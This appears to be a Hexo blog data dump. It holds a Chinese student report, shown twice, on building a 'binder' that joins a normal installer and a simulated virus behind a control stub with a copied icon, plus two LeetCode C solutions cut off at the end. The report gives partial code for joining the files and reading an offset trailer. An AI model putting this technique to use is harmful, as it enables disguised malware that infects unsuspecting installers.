第二作者：薛野</p>\n</blockquote>\n<p>##研究背景<br>近些年病毒程序越来越猖狂，各种病毒更是和普通的安装程序绑定在一起，让一般用户（特指一般不去官网下载而且不验证MD5的用户），很容易在安装一般程序的时候顺手运行了黑客设计的病毒程序。这种用户主动运行病毒程序的方式让整个的入侵过程防不胜防。作为一个信息安全学习人员，我们在这里就研究一下怎么绑定程序自动后台运行两个程序。</p>\n<p>##材料准备<br>普通安装程序 <em>1；<br>模拟病毒程序 </em>1；<br>Visual Studio IDE <em>1；<br>Visual Studio 程序序列号 </em>1；<br>MS提供的c#编程语言</p>\n<p>##程序设计</p>\n<p>###开始阶段<br>开始的时候，我的小组程序设计是这样的。<br>1，肢解正常的安装程序；<br>2，在原来的安装程序资源中加入病毒程序；<br>3，用一些不知道怎么方法的方法运行起来病毒程序。<br>后来经过各种尝试和研究，发现第三步出了问题。虽然我们可以很容易的把正常安装程序肢解并且把病毒程序打包到安装程序中，而且外观上看不出什么问题来。但是悲剧的是运行安装程序的时候也没有什么问题（病毒程序根本不会运行）。这里也是我自己基础知识太薄弱。程序的最开始引导部分根本就不会有运行后边病毒的指令，怎么会运行病毒程序呢。</p>\n<p>###程序设计<br>后来的时候，我们小组有重新设计了新的程序；<br>1，提取正常安装程序的图标；<br>2，把病毒程序拼接到正常程序后边；<br>3，重新写一个新的控制程序，运行的时候让他拆开后边两个程序（正常安装程序以及病毒程序）并且相互独立运行；<br>4，把控制程序拼接到程序的最前端；<br>5，替换这个控制程序的图标。<br>总体来说就是这样的。<br><img src=\"http://ww4.sinaimg.cn/large/aa74c538jw1eluq49tthjj207b07zdfw.jpg\" alt=\"pic1\"><br>后来发现控制程序根本很难知道正常程序的起始位置和病毒程序的起始位置。在此之后我曾经很想让控制程序自动找到正常运行程序的起始特征标识以及病毒程序的特征标识，后来失败了。最终采取了另外的策略，在捆绑程序的时候，我们算好了正常程序和病毒程序的大小。然后把它们记录好了，放在病毒程序的后边，一共8个字节，记录了两个int，也就是病毒程序和正常程序起始位置相对于程序开始的偏移量。这样通过读取最后的两个位置，我们就可以直接找到正常程序和病毒程序的起始位置了。图示如下：<br><img src=\"http://ww4.sinaimg.cn/large/aa74c538jw1eluq59k7bzj207z09tgls.jpg\" alt=\"pic2\"></p>\n<p>###代码编写<br>写代码的时候问题最多。</p>\n<p>####拼接程序：<br>1，各种按键，各种头文件，各种界面设计代码一律省略；<br>2， CBoundTryDlg::OnBnClickedOk()<br>这个东西是捆绑过程的核心，在这个里边实现了程序的大小检测，程序的拼接以及最    后的大小记录。关键代码贴出来看看就好：<br><figure class=\"highlight cos\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">VirusFile.<span class=\"keyword\">Read</span>(pbyVirusFile, dwVirusFileLength)<span class=\"comment\">;</span></span><br><span class=\"line\"><span class=\"comment\">//就像上边这样把程序文件读进内存，然后记录程序大小。</span></span><br><span class=\"line\">DWORD dwInfectFilePos = dwContralFileLength<span class=\"comment\">;</span></span><br><span class=\"line\">DWORD dwInfectFilePos1 = dwContralFileLength + dwInfectFileLength<span class=\"comment\">;</span></span><br><span class=\"line\"><span class=\"comment\">//像这样记录好程序的起始位置，这里contral竟然拼写错了。</span></span><br><span class=\"line\"><span class=\"comment\">//这里dwInfectFilePos 就是正常程序的偏移量，也就是control（控制程序）的大小。</span></span><br><span class=\"line\"><span class=\"comment\">//dwInfectFilePos1 就是病毒程序的偏移量，也就是control + 正常程序的大小。</span></span><br><span class=\"line\">TargetFile.<span class=\"keyword\">Write</span>(pbyContralFile, dwContralFileLength)<span class=\"comment\">;</span></span><br><span class=\"line\">TargetFile.<span class=\"keyword\">Write</span>(pbyInfectFile, dwInfectFileLength)<span class=\"comment\">;</span></span><br><span class=\"line\">TargetFile.<span class=\"keyword\">Write</span>(pbyVirusFile, dwVirusFileLength)<span class=\"comment\">;</span></span><br><span class=\"line\">TargetFile.<span class=\"keyword\">Write</span>(FileInfo, sizeof(FileInfo))<span class=\"comment\">;</span></span><br><span class=\"line\"><span class=\"comment\">//上边就是写入文件的过程了。</span></span><br></pre></td></tr></table></figure></p>\n<p>3，更换图标<br>这一块难度很大。想了很多代码。过程如下：<br>1，可以通过图标句柄制造出一个图标，然后按到程序里边；<br>2，可以扫描程序图标造出一个新的图标，然后按到程序里边；<br>3，直接在程序中查找图标，按到新的程序里边。<br>前两个方案经过一整天的实验宣告失败。可能是由于对于程序句柄以及图标处理了解    太少。后来从网上找到了第三种方案的代码，读懂之后稍作修改，实现了该功能。<br>控制程序：<br>这个东西技术含量比较大。最大的问题就是：程序运行的时候很难测试<br>这个程序的核心在于，拆解这个程序后边的部分，把一个大的程序拆解然后运行。<br>需要在这个控制程序本身的末尾找到标明正常程序和病毒程序偏移量的两个int。<br>问题是写代码的时候根本没办法调试啊！程序一跑起来，怎么可能在debug的时候在自己本身的最后边找到这两个int呢。因为写入这两个int以及把整个最后的程序组装起来的试前边说的拼接程序，写这部分代码的时候根本没有后边的程序啊。<br>详细说明如下：<br><img src=\"http://ww4.sinaimg.cn/large/aa74c538jw1eluq59k7bzj207z09tgls.jpg\" alt=\"pic2\"><br>在控制程序编写过程中，debug生成的程序仅仅是控制程序部分。一旦运行起来，他就要去找最后的“正常程序和病毒程序的位置”，然后现在还没拼接呢，根本不存在啊。接下来去找偏移量肯定会报错了。因为这一块内存已经不归控制程序管了。<br>最后我机智的用了另外一个小程序代替控制程序，先运行前边的拼接程序，组成一个用于实验的结构完整的拼接好的程序。然后把代码写成这样：<br>exeFullPath = “E:\\res.exe”;<br>也就是试验中控制程序控制的目标是这个结构完成的虚拟程序，而不是自己。调试好各个拆分点等等，最后在改成控制本身就可以了。<br>关键代码如下：<br><figure class=\"highlight less\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LogFile<span class=\"selector-class\">.Seek</span>(-<span class=\"number\">8</span>,<span class=\"attribute\">CFile</span>::end);</span><br><span class=\"line\">CString strBuf,strBuf2;</span><br><span class=\"line\">LogFile<span class=\"selector-class\">.Read</span>(strBuf.GetBufferSetLength(<span class=\"number\">4</span>),<span class=\"number\">4</span>);</span><br><span class=\"line\">LogFile<span class=\"selector-class\">.Seek</span>(-<span class=\"number\">4</span>, <span class=\"attribute\">CFile</span>::end);</span><br><span class=\"line\">LogFile<span class=\"selector-class\">.Read</span>(strBuf2.GetBufferSetLength(<span class=\"number\">4</span>), <span class=\"number\">4</span>);</span><br></pre></td></tr></table></figure></p>\n<p>在程序的结尾读出8字节的记录信息，然后存储好当做位置用。<br><figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strExecFilename1= <span class=\"string\">\"1.exe\"</span><span class=\"comment\">;</span></span><br><span class=\"line\">strExecFilename2= <span class=\"string\">\"2.exe\"</span><span class=\"comment\">;</span></span><br><span class=\"line\">strEncrypt=strBuf.Mid(<span class=\"number\">0</span>,<span class=\"number\">8</span>)<span class=\"comment\">;</span></span><br><span class=\"line\">memcpy(&amp;dwFirstLength,strBuf.GetBuffer(<span class=\"number\">4</span>),<span class=\"number\">4</span>)<span class=\"comment\">;</span></span><br><span class=\"line\">memcpy(&amp;dwSecondLength,strBuf2.GetBuffer(<span class=\"number\">4</span>),<span class=\"number\">4</span>)<span class=\"comment\">;</span></span><br></pre></td></tr></table></figure></p>\n<p>根据上边得到的偏移量信息，找到拆分点。<br>然后拆分运行就可以了。</p>\n<p>###程序隐藏<br>程序隐藏部分按说是比较容易处理的。直接开启隐藏进程就可以了。但是不知道为什么，一旦开起了隐藏，直接程序就不能正常跑了。全部程序都隐藏起来了。这里代码有一点问题，还在调试过程中。</p>\n<p>##最后的收获<br>1，老师说得对啊，自己做的才最有收获，自己研究的才最能提升；<br>2，设计程序的时候一定要基于在对本程序机理的理解的前提下设计，贸然动手只会浪费时间；<br>3，对于很多东西自己上网查找很靠谱，按照自己设计的路线有时候根本行不通；<br>4，这下算是对于exe格式的程序有了更多的了解。知道了怎么写出来捆绑安装的程序了。而且是静默的捆绑安装，不是简单的程序打包。<br>5，团队给了我无限的创意和力量！<br>6，程序隐藏真心任重而道远，接下来的程序加壳脱壳更是难以设计。这方面知识欠缺的太多了，急需要补充一下。</p>\n","excerpt":"<blockquote>\n<p>#程序拼接软件研究与实现<br>","more":"<br>第一作者：李松   第二作者：薛野</p>\n</blockquote>\n<p>##研究背景<br>近些年病毒程序越来越猖狂，各种病毒更是和普通的安装程序绑定在一起，让一般用户（特指一般不去官网下载而且不验证MD5的用户），很容易在安装一般程序的时候顺手运行了黑客设计的病毒程序。这种用户主动运行病毒程序的方式让整个的入侵过程防不胜防。作为一个信息安全学习人员，我们在这里就研究一下怎么绑定程序自动后台运行两个程序。</p>\n<p>##材料准备<br>普通安装程序 <em>1；<br>模拟病毒程序 </em>1；<br>Visual Studio IDE <em>1；<br>Visual Studio 程序序列号 </em>1；<br>MS提供的c#编程语言</p>\n<p>##程序设计</p>\n<p>###开始阶段<br>开始的时候，我的小组程序设计是这样的。<br>1，肢解正常的安装程序；<br>2，在原来的安装程序资源中加入病毒程序；<br>3，用一些不知道怎么方法的方法运行起来病毒程序。<br>后来经过各种尝试和研究，发现第三步出了问题。虽然我们可以很容易的把正常安装程序肢解并且把病毒程序打包到安装程序中，而且外观上看不出什么问题来。但是悲剧的是运行安装程序的时候也没有什么问题（病毒程序根本不会运行）。这里也是我自己基础知识太薄弱。程序的最开始引导部分根本就不会有运行后边病毒的指令，怎么会运行病毒程序呢。</p>\n<p>###程序设计<br>后来的时候，我们小组有重新设计了新的程序；<br>1，提取正常安装程序的图标；<br>2，把病毒程序拼接到正常程序后边；<br>3，重新写一个新的控制程序，运行的时候让他拆开后边两个程序（正常安装程序以及病毒程序）并且相互独立运行；<br>4，把控制程序拼接到程序的最前端；<br>5，替换这个控制程序的图标。<br>总体来说就是这样的。<br><img src=\"http://ww4.sinaimg.cn/large/aa74c538jw1eluq49tthjj207b07zdfw.jpg\" alt=\"pic1\"><br>后来发现控制程序根本很难知道正常程序的起始位置和病毒程序的起始位置。在此之后我曾经很想让控制程序自动找到正常运行程序的起始特征标识以及病毒程序的特征标识，后来失败了。最终采取了另外的策略，在捆绑程序的时候，我们算好了正常程序和病毒程序的大小。然后把它们记录好了，放在病毒程序的后边，一共8个字节，记录了两个int，也就是病毒程序和正常程序起始位置相对于程序开始的偏移量。这样通过读取最后的两个位置，我们就可以直接找到正常程序和病毒程序的起始位置了。图示如下：<br><img src=\"http://ww4.sinaimg.cn/large/aa74c538jw1eluq59k7bzj207z09tgls.jpg\" alt=\"pic2\"></p>\n<p>###代码编写<br>写代码的时候问题最多。</p>\n<p>####拼接程序：<br>1，各种按键，各种头文件，各种界面设计代码一律省略；<br>2， CBoundTryDlg::OnBnClickedOk()<br>这个东西是捆绑过程的核心，在这个里边实现了程序的大小检测，程序的拼接以及最    后的大小记录。关键代码贴出来看看就好：<br><figure class=\"highlight cos\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">VirusFile.<span class=\"keyword\">Read</span>(pbyVirusFile, dwVirusFileLength)<span class=\"comment\">;</span></span><br><span class=\"line\"><span class=\"comment\">//就像上边这样把程序文件读进内存，然后记录程序大小。</span></span><br><span class=\"line\">DWORD dwInfectFilePos = dwContralFileLength<span class=\"comment\">;</span></span><br><span class=\"line\">DWORD dwInfectFilePos1 = dwContralFileLength + dwInfectFileLength<span class=\"comment\">;</span></span><br><span class=\"line\"><span class=\"comment\">//像这样记录好程序的起始位置，这里contral竟然拼写错了。</span></span><br><span class=\"line\"><span class=\"comment\">//这里dwInfectFilePos 就是正常程序的偏移量，也就是control（控制程序）的大小。</span></span><br><span class=\"line\"><span class=\"comment\">//dwInfectFilePos1 就是病毒程序的偏移量，也就是control + 正常程序的大小。</span></span><br><span class=\"line\">TargetFile.<span class=\"keyword\">Write</span>(pbyContralFile, dwContralFileLength)<span class=\"comment\">;</span></span><br><span class=\"line\">TargetFile.<span class=\"keyword\">Write</span>(pbyInfectFile, dwInfectFileLength)<span class=\"comment\">;</span></span><br><span class=\"line\">TargetFile.<span class=\"keyword\">Write</span>(pbyVirusFile, dwVirusFileLength)<span class=\"comment\">;</span></span><br><span class=\"line\">TargetFile.<span class=\"keyword\">Write</span>(FileInfo, sizeof(FileInfo))<span class=\"comment\">;</span></span><br><span class=\"line\"><span class=\"comment\">//上边就是写入文件的过程了。</span></span><br></pre></td></tr></table></figure></p>\n<p>3，更换图标<br>这一块难度很大。想了很多代码。过程如下：<br>1，可以通过图标句柄制造出一个图标，然后按到程序里边；<br>2，可以扫描程序图标造出一个新的图标，然后按到程序里边；<br>3，直接在程序中查找图标，按到新的程序里边。<br>前两个方案经过一整天的实验宣告失败。可能是由于对于程序句柄以及图标处理了解    太少。后来从网上找到了第三种方案的代码，读懂之后稍作修改，实现了该功能。<br>控制程序：<br>这个东西技术含量比较大。最大的问题就是：程序运行的时候很难测试<br>这个程序的核心在于，拆解这个程序后边的部分，把一个大的程序拆解然后运行。<br>需要在这个控制程序本身的末尾找到标明正常程序和病毒程序偏移量的两个int。<br>问题是写代码的时候根本没办法调试啊！程序一跑起来，怎么可能在debug的时候在自己本身的最后边找到这两个int呢。因为写入这两个int以及把整个最后的程序组装起来的试前边说的拼接程序，写这部分代码的时候根本没有后边的程序啊。<br>详细说明如下：<br><img src=\"http://ww4.sinaimg.cn/large/aa74c538jw1eluq59k7bzj207z09tgls.jpg\" alt=\"pic2\"><br>在控制程序编写过程中，debug生成的程序仅仅是控制程序部分。一旦运行起来，他就要去找最后的“正常程序和病毒程序的位置”，然后现在还没拼接呢，根本不存在啊。接下来去找偏移量肯定会报错了。因为这一块内存已经不归控制程序管了。<br>最后我机智的用了另外一个小程序代替控制程序，先运行前边的拼接程序，组成一个用于实验的结构完整的拼接好的程序。然后把代码写成这样：<br>exeFullPath = “E:\\res.exe”;<br>也就是试验中控制程序控制的目标是这个结构完成的虚拟程序，而不是自己。调试好各个拆分点等等，最后在改成控制本身就可以了。<br>关键代码如下：<br><figure class=\"highlight less\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LogFile<span class=\"selector-class\">.Seek</span>(-<span class=\"number\">8</span>,<span class=\"attribute\">CFile</span>::end);</span><br><span class=\"line\">CString strBuf,strBuf2;</span><br><span class=\"line\">LogFile<span class=\"selector-class\">.Read</span>(strBuf.GetBufferSetLength(<span class=\"number\">4</span>),<span class=\"number\">4</span>);</span><br><span class=\"line\">LogFile<span class=\"selector-class\">.Seek</span>(-<span class=\"number\">4</span>, <span class=\"attribute\">CFile</span>::end);</span><br><span class=\"line\">LogFile<span class=\"selector-class\">.Read</span>(strBuf2.GetBufferSetLength(<span class=\"number\">4</span>), <span class=\"number\">4</span>);</span><br></pre></td></tr></table></figure></p>\n<p>在程序的结尾读出8字节的记录信息，然后存储好当做位置用。<br><figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strExecFilename1= <span class=\"string\">\"1.exe\"</span><span class=\"comment\">;</span></span><br><span class=\"line\">strExecFilename2= <span class=\"string\">\"2.exe\"</span><span class=\"comment\">;</span></span><br><span class=\"line\">strEncrypt=strBuf.Mid(<span class=\"number\">0</span>,<span class=\"number\">8</span>)<span class=\"comment\">;</span></span><br><span class=\"line\">memcpy(&amp;dwFirstLength,strBuf.GetBuffer(<span class=\"number\">4</span>),<span class=\"number\">4</span>)<span class=\"comment\">;</span></span><br><span class=\"line\">memcpy(&amp;dwSecondLength,strBuf2.GetBuffer(<span class=\"number\">4</span>),<span class=\"number\">4</span>)<span class=\"comment\">;</span></span><br></pre></td></tr></table></figure></p>\n<p>根据上边得到的偏移量信息，找到拆分点。<br>然后拆分运行就可以了。</p>\n<p>###程序隐藏<br>程序隐藏部分按说是比较容易处理的。直接开启隐藏进程就可以了。但是不知道为什么，一旦开起了隐藏，直接程序就不能正常跑了。全部程序都隐藏起来了。这里代码有一点问题，还在调试过程中。</p>\n<p>##最后的收获<br>1，老师说得对啊，自己做的才最有收获，自己研究的才最能提升；<br>2，设计程序的时候一定要基于在对本程序机理的理解的前提下设计，贸然动手只会浪费时间；<br>3，对于很多东西自己上网查找很靠谱，按照自己设计的路线有时候根本行不通；<br>4，这下算是对于exe格式的程序有了更多的了解。知道了怎么写出来捆绑安装的程序了。而且是静默的捆绑安装，不是简单的程序打包。<br>5，团队给了我无限的创意和力量！<br>6，程序隐藏真心任重而道远，接下来的程序加壳脱壳更是难以设计。这方面知识欠缺的太多了，急需要补充一下。</p>"},{"title":"leetcode Missing Number","date":"2015-10-26T21:45:20.000Z","_content":"Use the sumup of all the number subtract the sum of them.\n```\nint missingNumber(int* nums, int numsSize) {\n    long long int sum = 0;\n    for(int i = 0;i < numsSize;++ i) sum += nums[i];\n    return (numsSize + 1) * numsSize / 2 - sum;\n}\n```\n","source":"_posts/leetcodeMissingNumber.md","raw":"title: \"leetcode Missing Number\"\ndate: 2015-10-26 21:45:20\ntags: leetcode\n---\nUse the sumup of all the number subtract the sum of them.\n```\nint missingNumber(int* nums, int numsSize) {\n    long long int sum = 0;\n    for(int i = 0;i < numsSize;++ i) sum += nums[i];\n    return (numsSize + 1) * numsSize / 2 - sum;\n}\n```\n","slug":"leetcodeMissingNumber","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681vu002uwypd44d5sank","content":"<p>Use the sumup of all the number subtract the sum of them.<br><figure class=\"highlight axapta\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> missingNumber(<span class=\"keyword\">int</span>* nums, <span class=\"keyword\">int</span> numsSize) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> <span class=\"keyword\">int</span> <span class=\"keyword\">sum</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; numsSize;++ i) <span class=\"keyword\">sum</span> += nums[i];</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (numsSize + <span class=\"number\">1</span>) * numsSize / <span class=\"number\">2</span> - <span class=\"keyword\">sum</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","excerpt":"","more":"<p>Use the sumup of all the number subtract the sum of them.<br><figure class=\"highlight axapta\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> missingNumber(<span class=\"keyword\">int</span>* nums, <span class=\"keyword\">int</span> numsSize) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> <span class=\"keyword\">int</span> <span class=\"keyword\">sum</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; numsSize;++ i) <span class=\"keyword\">sum</span> += nums[i];</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (numsSize + <span class=\"number\">1</span>) * numsSize / <span class=\"number\">2</span> - <span class=\"keyword\">sum</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"leetcode Ugly Number II","date":"2015-10-26T20:44:58.000Z","_content":"This is not a difficult one.\nBasic idea is, assum that we have a self-sorted queue. Everytime, we choose the smallest one *n*, insert 2\\*n , 3\\*n , 5\\*n into this queue. After n times, we will get the n-th Ugly number.\nThe time will be $O(nlogn)$. Do we have a better way? The answer is YES!\n<!--more-->\nRemeber the key point is we need to always get the smallest number of this queue. If we use three queue, every time we choose the smallest number of this three queue rears n. And put 2\\*n to the *L2* queue. put 3\\*n to the *L3* queue, put 5\\*n to the *L5* queue. We can confirm that these queues are in order. Because every time the choosen number *n* is larger than the one before that. So the in every queue, the new numbers will be the largest one.\n\n```\nint min(int a,int b){\n    if(a > b) return b;\n    return a;\n    \n}\nint nthUglyNumber(int n) {\n    int l2[10000], l3[10000],l5[10000];\n    int c2 = 1,c3 = 1,c5 = 1;\n    int h2 = 0,h3 = 0,h5 = 0;\n    int now = 1;\n    l2[0] = l3[0] = l5[0] = 1;\n    for(int i = 0;i < n;++ i){\n        now = min(l2[h2],min(l3[h3],l5[h5]));\n        if(now == l2[h2]) h2 ++;\n        if(now == l3[h3]) h3 ++;\n        if(now == l5[h5]) h5 ++;\n        l2[c2 ++] = now * 2;\n        l3[c3 ++] = now * 3;\n        l5[c5 ++] = now * 5;\n        cout << now << endl;\n    }\n    return now;\n}\n```\n\n","source":"_posts/leetcodeUglyNumberII.md","raw":"title: \"leetcode Ugly Number II\"\ndate: 2015-10-26 20:44:58\ntags: leetcode\n---\nThis is not a difficult one.\nBasic idea is, assum that we have a self-sorted queue. Everytime, we choose the smallest one *n*, insert 2\\*n , 3\\*n , 5\\*n into this queue. After n times, we will get the n-th Ugly number.\nThe time will be $O(nlogn)$. Do we have a better way? The answer is YES!\n<!--more-->\nRemeber the key point is we need to always get the smallest number of this queue. If we use three queue, every time we choose the smallest number of this three queue rears n. And put 2\\*n to the *L2* queue. put 3\\*n to the *L3* queue, put 5\\*n to the *L5* queue. We can confirm that these queues are in order. Because every time the choosen number *n* is larger than the one before that. So the in every queue, the new numbers will be the largest one.\n\n```\nint min(int a,int b){\n    if(a > b) return b;\n    return a;\n    \n}\nint nthUglyNumber(int n) {\n    int l2[10000], l3[10000],l5[10000];\n    int c2 = 1,c3 = 1,c5 = 1;\n    int h2 = 0,h3 = 0,h5 = 0;\n    int now = 1;\n    l2[0] = l3[0] = l5[0] = 1;\n    for(int i = 0;i < n;++ i){\n        now = min(l2[h2],min(l3[h3],l5[h5]));\n        if(now == l2[h2]) h2 ++;\n        if(now == l3[h3]) h3 ++;\n        if(now == l5[h5]) h5 ++;\n        l2[c2 ++] = now * 2;\n        l3[c3 ++] = now * 3;\n        l5[c5 ++] = now * 5;\n        cout << now << endl;\n    }\n    return now;\n}\n```\n\n","slug":"leetcodeUglyNumberII","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681vv002wwypdyb50quuv","content":"<p>This is not a difficult one.<br>Basic idea is, assum that we have a self-sorted queue. Everytime, we choose the smallest one <em>n</em>, insert 2*n , 3*n , 5*n into this queue. After n times, we will get the n-th Ugly number.<br>The time will be $O(nlogn)$. Do we have a better way? The answer is YES!<br><a id=\"more\"></a><br>Remeber the key point is we need to always get the smallest number of this queue. If we use three queue, every time we choose the smallest number of this three queue rears n. And put 2*n to the <em>L2</em> queue. put 3*n to the <em>L3</em> queue, put 5*n to the <em>L5</em> queue. We can confirm that these queues are in order. Because every time the choosen number <em>n</em> is larger than the one before that. So the in every queue, the new numbers will be the largest one.</p>\n<figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">int</span> <span class=\"built_in\">min</span>(<span class=\"built_in\">int</span> a,<span class=\"built_in\">int</span> b)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(a &gt; b) <span class=\"keyword\">return</span> b<span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> a<span class=\"comment\">;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">int</span> nthUglyNumber(<span class=\"built_in\">int</span> n) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">int</span> l2[<span class=\"number\">10000</span>], l3[<span class=\"number\">10000</span>],l5[<span class=\"number\">10000</span>]<span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"built_in\">int</span> c2 = <span class=\"number\">1</span>,c3 = <span class=\"number\">1</span>,c5 = <span class=\"number\">1</span><span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"built_in\">int</span> h2 = <span class=\"number\">0</span>,h3 = <span class=\"number\">0</span>,h5 = <span class=\"number\">0</span><span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"built_in\">int</span> <span class=\"built_in\">now</span> = <span class=\"number\">1</span><span class=\"comment\">;</span></span><br><span class=\"line\">    l2[<span class=\"number\">0</span>] = l3[<span class=\"number\">0</span>] = l5[<span class=\"number\">0</span>] = <span class=\"number\">1</span><span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"built_in\">int</span> i = <span class=\"number\">0</span><span class=\"comment\">;i &lt; n;++ i)&#123;</span></span><br><span class=\"line\">        <span class=\"built_in\">now</span> = <span class=\"built_in\">min</span>(l2[h2],<span class=\"built_in\">min</span>(l3[h3],l5[h5]))<span class=\"comment\">;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"built_in\">now</span> == l2[h2]) h2 ++<span class=\"comment\">;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"built_in\">now</span> == l3[h3]) h3 ++<span class=\"comment\">;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"built_in\">now</span> == l5[h5]) h5 ++<span class=\"comment\">;</span></span><br><span class=\"line\">        l2[c2 ++] = <span class=\"built_in\">now</span> * <span class=\"number\">2</span><span class=\"comment\">;</span></span><br><span class=\"line\">        l3[c3 ++] = <span class=\"built_in\">now</span> * <span class=\"number\">3</span><span class=\"comment\">;</span></span><br><span class=\"line\">        l5[c5 ++] = <span class=\"built_in\">now</span> * <span class=\"number\">5</span><span class=\"comment\">;</span></span><br><span class=\"line\">        cout &lt;&lt; <span class=\"built_in\">now</span> &lt;&lt; endl<span class=\"comment\">;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">now</span><span class=\"comment\">;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","excerpt":"<p>This is not a difficult one.<br>Basic idea is, assum that we have a self-sorted queue. Everytime, we choose the smallest one <em>n</em>, insert 2*n , 3*n , 5*n into this queue. After n times, we will get the n-th Ugly number.<br>The time will be $O(nlogn)$. Do we have a better way? The answer is YES!<br>","more":"<br>Remeber the key point is we need to always get the smallest number of this queue. If we use three queue, every time we choose the smallest number of this three queue rears n. And put 2*n to the <em>L2</em> queue. put 3*n to the <em>L3</em> queue, put 5*n to the <em>L5</em> queue. We can confirm that these queues are in order. Because every time the choosen number <em>n</em> is larger than the one before that. So the in every queue, the new numbers will be the largest one.</p>\n<figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">int</span> <span class=\"built_in\">min</span>(<span class=\"built_in\">int</span> a,<span class=\"built_in\">int</span> b)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(a &gt; b) <span class=\"keyword\">return</span> 